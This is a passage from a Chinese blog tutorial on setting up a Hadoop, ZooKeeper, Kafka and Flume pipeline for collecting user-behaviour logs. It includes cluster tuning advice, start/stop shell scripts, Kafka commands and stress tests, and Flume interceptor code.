class="line-numbers-rows"><span></span></span></code></pre><p>4）使用Sort程序评测MapReduce（要求性能特别好，普通性能不要去跑）</p><p>（1）使用RandomWriter来产生随机数，每个节点运行10个Map任务，每个Map产生大约1G大小的二进制随机数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar randomwriter random-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）执行Sort程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar <span class="token function">sort</span> random-data sorted-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）验证数据是否真正排好序了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar testmapredsort -sortInput random-data -sortOutput sorted-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-6-项目经验之Hadoop参数调优"><a href="#4-2-6-项目经验之Hadoop参数调优" class="headerlink" title="4.2.6 项目经验之Hadoop参数调优"></a>4.2.6 项目经验之Hadoop参数调优</h3><p><strong>1）HDFS参数调优hdfs-site.xml</strong></p><p><strong>NameNode有一个工作线程池，用来处理不同DataNode的并发心跳以及客户端并发的元数据操作。</strong></p><p>对于大集群或者有大量客户端的集群来说，通常需要增大参数dfs.namenode.handler.count的默认值10。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.handler.count<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>dfs.namenode.handler.count=<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637663793390.png" alt="1637663793390">  ，比如集群规模为8台时，此参数设置为41。</p><p><strong>2）YARN参数调优yarn-site.xml</strong></p><p>（1）情景描述：总共7台机器，每天几亿条数据，数据源-&gt;Flume-&gt;Kafka-&gt;HDFS-&gt;Hive</p><p>面临问题：数据统计主要用HiveSQL，没有数据倾斜，小文件已经做了合并处理，开启的JVM重用，而且IO没有阻塞，内存用了不到50%。但是还是跑的非常慢，而且数据量洪峰过来时，整个集群都会宕掉。基于这种情况有没有优化方案。</p><p>（2）解决办法：</p><p>内存利用率不够。这个一般是Yarn的2个配置造成的，单个任务可以申请的最大内存大小，和Hadoop单个节点可用内存大小。调节这两个参数能提高系统内存的利用率。</p><p>（a）yarn.nodemanager.resource.memory-mb</p><p>表示该节点上YARN可使用的物理内存总量，默认是8192（MB），注意，如果你的节点内存资源不够8GB，则需要调减小这个值，而YARN不会智能的探测节点的物理内存总量。</p><p>（b）yarn.scheduler.maximum-allocation-mb</p><p>单个任务可申请的最多物理内存量，默认是8192（MB）。</p><h2 id="4-3-Zookeeper安装"><a href="#4-3-Zookeeper安装" class="headerlink" title="4.3 Zookeeper安装"></a>4.3 Zookeeper安装</h2><h3 id="4-3-1-安装ZK"><a href="#4-3-1-安装ZK" class="headerlink" title="4.3.1 安装ZK"></a>4.3.1 安装ZK</h3><p>详见：</p><p>集群规划</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td></tr></tbody></table><h3 id="4-3-2-ZK集群启动停止脚本"><a href="#4-3-2-ZK集群启动停止脚本" class="headerlink" title="4.3.2 ZK集群启动停止脚本"></a>4.3.2 ZK集群启动停止脚本</h3><p>1）在hadoop102的/home/molly/bin目录下创建脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim zk.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>#在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashcase $1 in"start")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 启动 ------------        ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh start"    done&#125;;;"stop")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 停止 ------------            ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop"    done&#125;;;"status")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo ---------- zookeeper $i 状态 ------------            ssh $i "/opt/module/zookeeper-3.5.7/bin/zkServer.sh status"    done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre><code>[molly@hadoop102 bin]$ chmod u+x zk.sh</code></pre><p>3）Zookeeper集群启动脚本</p><pre><code>[molly@hadoop102 module]$ zk.sh start</code></pre><p>4）Zookeeper集群停止脚本</p><pre><code>[molly@hadoop102 module]$ zk.sh stop</code></pre><h2 id="4-4-Kafka安装"><a href="#4-4-Kafka安装" class="headerlink" title="4.4 Kafka安装"></a>4.4 Kafka安装</h2><h3 id="4-4-1-Kafka集群安装"><a href="#4-4-1-Kafka集群安装" class="headerlink" title="4.4.1 Kafka集群安装"></a>4.4.1 Kafka集群安装</h3><p>详见：<a href="https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/">kafka学习笔记（一） kafka搭建</a></p><p>配置文件：</p><pre><code>log.dirs=/opt/moudule/kafka 2.11-2.4.1/dataszookeeper.connect=hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka</code></pre><p>集群规划：</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Kafka</td><td>Kafka</td><td>Kafka</td><td>Kafka</td></tr></tbody></table><h3 id="4-4-2-Kafka集群启动停止脚本"><a href="#4-4-2-Kafka集群启动停止脚本" class="headerlink" title="4.4.2 Kafka集群启动停止脚本"></a>4.4.2 Kafka集群启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本kf.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim kf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo " --------启动 $i Kafka-------"        ssh $i "/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties"    done&#125;;;"stop")&#123;    for i in hadoop102 hadoop103 hadoop104    do        echo " --------停止 $i Kafka-------"        ssh $i "/opt/module/kafka/bin/kafka-server-stop.sh stop"    done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x kf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）kf集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ kf.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看zookeeper信息<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637664623705.png" alt="1637664623705"></p><p>4）kf集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ kf.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-3-Kafka常用命令"><a href="#4-4-3-Kafka常用命令" class="headerlink" title="4.4.3 Kafka常用命令"></a>4.4.3 Kafka常用命令</h3><p>1）查看Kafka Topic列表</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181/kafka --list<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --list<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2）创建Kafka Topic</p><p>进入到/opt/module/kafka/目录下创建日志主题</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka --create --replication-factor 1 --partitions 1 --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）删除Kafka Topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --delete --zookeeper hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）Kafka生产消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-producer.sh \--broker-list hadoop102:9092 --topic topic_log\<span class="token operator">></span>hello world\<span class="token operator">></span>molly molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5）Kafka消费消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>–from-beginning：会把主题中以往所有的数据都读取出来。根据业务场景选择是否增加该配置。</p><p>6）查看Kafka Topic详情</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181/kafka \--describe --topic topic_log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-4-4-项目经验之Kafka压力测试"><a href="#4-4-4-项目经验之Kafka压力测试" class="headerlink" title="4.4.4 项目经验之Kafka压力测试"></a>4.4.4 项目经验之Kafka压力测试</h3><p><strong>1）Kafka压测</strong></p><p>用Kafka官方自带的脚本，对Kafka进行压测。Kafka压测时，可以查看到哪个地方出现了瓶颈（<strong>CPU，内存，网络IO</strong>）。一般都是网络IO达到瓶颈。 </p><p>kafka-consumer-perf-test.sh<br>kafka-producer-perf-test.sh</p><p><strong>2）Kafka Producer压力测试</strong></p><p>（1）在/opt/module/kafka/bin目录下面有这两个文件。我们来测试一下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-producer-perf-test.sh --topic <span class="token function">test</span> --record-size 100 --num-records 100000 --throughput -1 --producer-props bootstrap.servers<span class="token operator">=</span>hadoop102:9092,hadoop103:9092,hadoop104:9092<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：</p><p>record-size是一条信息有多大，单位是字节。<br>num-records是总共发送多少条信息。<br>throughput 是每秒多少条信息，设成-1，表示不限流，可测出生产者最大吞吐量。</p><p><strong>（2）Kafka会打印下面的信息</strong></p><pre class="line-numbers language-bash"><code class="language-bash">100000 records sent, 95877.277085 records/sec <span class="token punctuation">(</span>9.14 MB/sec<span class="token punctuation">)</span>, 187.68 ms avg latency, 424.00 ms max latency, 155 ms 50th, 411 ms 95th, 423 ms 99th, 424 ms 99.9th.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数解析：本例中一共写入10w条消息，吞吐量为9.14 MB/sec，每次写入的平均延迟为187.68毫秒，最大的延迟为424.00毫秒。</p><p><strong>3）Kafka Consumer压力测试</strong></p><p>Consumer的测试，如果这四个指标（IO，CPU，内存，网络）都不能改变，考虑增加分区数来提升性能。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-consumer-perf-test.sh --broker-list hadoop102:9092,hadoop103:9092,hadoop104:9092 --topic <span class="token function">test</span> --fetch-size 10000 --messages 10000000 --threads 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><p>–zookeeper 指定zookeeper的链接信息<br>–topic 指定topic的名称<br>–fetch-size 指定每次fetch的数据的大小<br>–messages 总共要消费的消息个数</p><p>测试结果说明：</p><pre class="line-numbers language-bash"><code class="language-bash">start.time, end.time, data.consumed.in.MB, MB.sec, data.consumed.in.nMsg, nMsg.sec2019-02-19 20:29:07:566, 2019-02-19 20:29:12:170, 9.5368, 2.0714, 100010, 21722.4153<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开始测试时间，测试结束数据，共消费数据9.5368MB，吞吐量2.0714MB/s，共消费100010条，平均每秒消费21722.4153条。</p><h3 id="4-4-5-项目经验之Kafka机器数量计算"><a href="#4-4-5-项目经验之Kafka机器数量计算" class="headerlink" title="4.4.5 项目经验之Kafka机器数量计算"></a>4.4.5 项目经验之Kafka机器数量计算</h3><p>Kafka机器数量（经验公式）=2x（峰值生产速度x副本数/100）+1<br>先拿到峰值生产速度，再根据设定的副本数，就能预估出需要部署Kafka的数量。<br>比如我们的峰值生产速度是50M/s。副本数为2。<br>Kafka机器数量=2<em>（50</em>2/100）+ 1=3台</p><h3 id="4-4-6-项目经验值Kafka分区数计算"><a href="#4-4-6-项目经验值Kafka分区数计算" class="headerlink" title="4.4.6 项目经验值Kafka分区数计算"></a>4.4.6 项目经验值Kafka分区数计算</h3><p>1）创建一个只有1个分区的topic</p><p>2）测试这个topic的producer吞吐量和consumer吞吐量。</p><p>3）假设他们的值分别是Tp和Tc，单位可以是MB/s。</p><p>4）然后假设总的目标吞吐量是Tt，那么分区数=Tt / min（Tp，Tc）</p><p>例如：producer吞吐量=20m/s；consumer吞吐量=50m/s，期望吞吐量100m/s；</p><p>分区数=100 / 20 =5分区</p><p><a href="https://blog.csdn.net/weixin_42641909/article/details/89294698">https://blog.csdn.net/weixin_42641909/article/details/89294698</a></p><p>分区数一般设置为：3-10个</p><h1 id="5-项目1-采集用户行为数据"><a href="#5-项目1-采集用户行为数据" class="headerlink" title="5 项目1 采集用户行为数据"></a>5 项目1 采集用户行为数据</h1><p>如下图所示，用户行为经过埋点进行收集然后存放到logserver上，这个时候利用Flume（第一层）从日志服务器logserver上采集数据送到kafka中，再通过一个flume（第二层）接收，最后存储到HDFS中。</p><p>再看flume架构：</p><p>第一层flume，我们source选择为taildirSource,channel选Kafka Channel（这里不需要sink，因为KafkaChanel直接将数据存到Kafka中了）。</p><p>第二层flume：我们source选择为KafkaSource,channel选fileChannel,sink选择HDFS Sink。</p><p>其中flume安装详见：<a href="https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/">flume学习笔记（一） flume搭建</a></p><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637724868076.png" alt="1637724868076"></p><p><strong>日志采集Flume集群规划</strong>：</p><p>我们将第一层flume安装在hadoop102和hadoop103上，第二层flume安装在hadoop104.</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume(采集日志)</td><td>（第一层）Flume</td><td>（第一层）  Flume</td><td>（第二层  Flum</td></tr></tbody></table><h2 id="5-1-第一层flume采集"><a href="#5-1-第一层flume采集" class="headerlink" title="5.1 第一层flume采集"></a>5.1 第一层flume采集</h2><h3 id="5-1-1-项目经验之Flume组件选型"><a href="#5-1-1-项目经验之Flume组件选型" class="headerlink" title="5.1.1 项目经验之Flume组件选型"></a>5.1.1 项目经验之Flume组件选型</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637722930078.png" alt="1637722930078"></p><p>Flume直接读log日志的数据，log日志的格式是app.yyyy-mm-dd.log。注意其中logInterceptor主要对原始日志进行初步数据处理，删除空数据。</p><p><strong>1）Source</strong></p><p>（1）Taildir Source相比Exec Source、Spooling Directory Source的优势</p><p><strong>TailDir Source：断点续传、多目录。Flume1.6以前需要自己自定义Source记录每次读取文件位置，实现断点续传。</strong></p><p><strong>Exec Source</strong>可以实时搜集数据，但是在Flume不运行或者Shell命令出错的情况下，数据将会丢失。</p><p><strong>Spooling Directory Source</strong>监控目录，支持断点续传。</p><p>（2）batchSize大小如何设置？</p><p>+答：Event 1K左右时，500-1000合适（默认为100）</p><p><strong>2）Channel</strong></p><p><strong>采用Kafka Channel，省去了Sink，提高了效率。KafkaChannel数据存储在Kafka里面，所以数据是存储在磁盘中。</strong></p><p>注意在Flume1.7以前，Kafka Channel很少有人使用，因为发现parseAsFlumeEvent这个配置起不了作用。也就是无论parseAsFlumeEvent配置为true还是false，都会转为Flume Event。这样的话，造成的结果是，会始终都把Flume的headers中的信息混合着内容一起写入Kafka的消息中，这显然不是我所需要的，我只是需要把内容写入即可。</p><h3 id="5-1-2-日志采集Flume配置"><a href="#5-1-2-日志采集Flume配置" class="headerlink" title="5.1.2 日志采集Flume配置"></a>5.1.2 日志采集Flume配置</h3><p>1）Flume的具体配置如下：</p><p>​    （1）在/opt/module/flume/conf目录下创建file-flume-kafka.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ vim file-flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件配置如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#为各组件命名a1.sources = r1a1.channels = c1#描述sourcea1.sources.r1.type = TAILDIRa1.sources.r1.filegroups = f1a1.sources.r1.filegroups.f1 = /opt/module/applog/log/app.*a1.sources.r1.positionFile = /opt/module/flume/taildir_position.jsona1.sources.r1.interceptors =  i1a1.sources.r1.interceptors.i1.type = com.molly.flume.interceptor.ETLInterceptor$Builder#描述channela1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannela1.channels.c1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092a1.channels.c1.kafka.topic = topic_loga1.channels.c1.parseAsFlumeEvent = false#绑定source和channel以及sink和channel的关系a1.sources.r1.channels = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 注意：com.molly.flume.interceptor.ETLInterceptor是自定义的拦截器的全类名。需要根据用户自定义的拦截器做相应修改。</p><h3 id="5-1-3-Flume拦截器"><a href="#5-1-3-Flume拦截器" class="headerlink" title="5.1.3 Flume拦截器"></a>5.1.3 Flume拦截器</h3><p>在第一层flume中对原始数据进行清洗</p><p>1）创建Maven工程flume-interceptor</p><p>2）创建包名：com.molly.flume.interceptor</p><p>3）在pom.xml文件中添加如下配置</p><p>maven-compiler-plugin是打包插件。com.alibaba注意加 <scope>compile</scope>，把该组件打到包中。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.flume<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>flume-ng-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.62<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）在com.molly.flume.interceptor包下创建JSONUtils类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSONUtils</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isJSONValidate</span><span class="token punctuation">(</span>String log<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" 